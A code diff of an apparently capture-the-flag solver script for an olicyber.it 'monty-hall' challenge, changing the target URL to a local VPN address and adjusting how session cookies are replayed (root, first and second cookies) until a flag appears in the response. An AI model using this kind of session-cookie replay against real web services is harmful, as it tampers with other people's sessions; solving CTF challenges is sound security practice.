@@ -1,5 +1,5 @@
 import requests, base64
-url = "http://monty-hall.challs.olicyber.it"
+url = "http://192.168.100.3:38108" #remove url[:-6] when not using vpn
 
 def main():
     s = requests.session()
@@ -35,7 +35,7 @@ def main():
                             if len(s.cookies['session']) >= len(cookie):
                                 break
                             else: 
-                                s.cookies.set(domain=url[7:], path='/', name='session', value=cookie)
+                                s.cookies.set(domain=url[7:][:-6], path='/', name='session', value=cookie)
                     
                     if 'flag' in response.text:        
                         print(response.text)
@@ -43,12 +43,12 @@ def main():
                     
                     return
                 
-                s.cookies.set(domain=url[7:], path='/', name='session', value=second_cookie)
+                s.cookies.set(domain=url[7:][:-6], path='/', name='session', value=second_cookie)
                 
-            s.cookies.set(domain=url[7:], path='/', name='session', value=first_cookie)
+            s.cookies.set(domain=url[7:][:-6], path='/', name='session', value=first_cookie)
             
         
-        s.cookies.set(domain=url[7:], path='/', name='session', value=root_cookie)
+        s.cookies.set(domain=url[7:][:-6], path='/', name='session', value=root_cookie)
 
 
 if __name__ == "__main__":
